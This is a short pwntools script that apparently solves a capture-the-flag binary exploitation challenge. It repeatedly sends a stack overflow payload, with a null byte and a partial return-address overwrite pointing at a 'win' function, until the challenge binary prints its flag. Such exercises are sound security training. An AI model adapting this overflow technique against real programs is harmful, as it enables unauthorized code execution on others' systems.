from pwn import *

buffer_size = 0x78
buffer_limit = 0x4e
win_offset = 0x1B80

while True:
    io = process(['/challenge/binary-exploitation-null-write'])

    io.recvregex(br'Send your payload.*\n')
    io.send(b'A' * buffer_limit + b'\x00' + b'A' * (buffer_size - buffer_limit - 1) + pack(win_offset, 'all'))

    try:
        flag = io.recvregex(br'Here is your flag:\n(.+)\n', capture=True).group(1).decode()
        print(flag)
        break
    except:
        pass

